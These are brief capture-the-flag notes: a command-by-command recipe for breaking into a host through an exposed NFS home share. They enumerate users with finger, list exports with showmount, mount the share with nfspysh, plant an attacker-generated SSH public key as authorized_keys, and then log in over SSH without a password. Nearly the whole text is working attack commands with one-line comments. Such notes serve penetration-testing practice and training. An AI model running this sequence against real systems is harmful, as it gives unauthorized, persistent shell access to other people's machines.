CTF Notes
---------

# Enumerate Users via Finger
finger user@192.168.0.20

# Show nfs shares available
showmount -e 192.168.1.54

# User nfspysh to mount share and create .ssh directory
nfspysh -o server=192.168.0.20:/home/user
mkdir .ssh
cd .ssh

# Generate ssh key pair
ssh-keygen
cp id_rsa.pub /tmp/authorized_keys

# Transfer attacker public key to host
put /tmp/authorized_keys
exit

# Login to SSH server with no password
SSH_AUTH_SOCK=0 ssh user@192.168.0.20




